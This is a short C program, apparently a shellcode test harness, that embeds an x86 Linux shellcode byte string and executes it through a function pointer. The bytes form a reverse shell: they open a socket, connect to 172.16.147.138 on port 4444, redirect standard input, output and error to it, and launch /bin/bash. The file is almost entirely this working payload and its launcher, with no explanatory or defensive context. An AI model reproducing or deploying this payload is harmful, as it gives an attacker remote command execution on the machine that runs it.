#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\x83\xc1\x01\x31\xd2\xcd\x80\x89\xc7\x31\xc0\x50\x50\x68\xac\x10\x93\x8a\x66\x68\x11\x5c\x66\x6a\x02\x66\xb8\x6a\x01\x89\xfb\x89\xe1\x83\xc2\x10\xcd\x80\x31\xc0\x83\xc0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80\x31\xc0";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
